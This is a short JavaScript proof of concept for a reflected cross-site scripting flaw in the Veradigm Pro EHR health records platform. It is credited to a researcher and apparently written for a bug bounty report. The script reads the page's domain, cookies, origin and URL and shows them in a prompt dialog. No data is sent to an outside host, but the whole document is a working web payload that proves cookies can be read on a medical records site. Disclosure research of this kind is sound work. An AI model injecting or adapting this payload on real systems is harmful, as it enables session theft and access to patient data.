// Veradigm Pro EHR - Reflected XSS PoC
// Researcher: 0xpa1
(function(){
  var info = [
    'Domain: ' + document.domain,
    'Cookies: ' + document.cookie,
    'Origin: ' + window.location.origin,
    'URL: ' + window.location.href
  ].join('\n');
  prompt('XSS PoC by 0xpa1 - bugcrwd.vehr.veradigmcloud.com', info);
})();
